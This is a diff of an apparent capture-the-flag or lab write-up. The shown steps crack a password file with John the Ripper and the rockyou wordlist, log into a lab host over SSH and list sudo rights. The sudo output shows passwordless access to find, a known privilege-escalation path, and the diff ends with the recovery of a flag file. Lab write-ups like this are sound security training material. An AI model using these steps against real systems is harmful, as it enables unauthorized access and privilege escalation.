@@ -865,20 +865,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/Capstone/password
 ```
 ssh missy@10.10.91.89
 ```
-* ```sudo -l
-Matching Defaults entries for missy on ip-10-10-91-89:
-    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
-    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
-    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
-    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
-    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
-    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
-    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
-
-User missy may run the following commands on ip-10-10-91-89:
-    (ALL) NOPASSWD: /usr/bin/find
-```
-* ```history
+* `sudo -l` : User missy may run the following commands on ip-10-10-91-89: (ALL) NOPASSWD: /usr/bin/find
+* ```
+  history
     1  ls
     2  cd missy/
     3  ls
@@ -896,7 +885,6 @@ User missy may run the following commands on ip-10-10-91-89:
    15  cd leonard/
    16  cd rootflag/
    17  su root
-```
 * Recovered flag1.
 ```
 cat ./Documents/flag1.txt` 
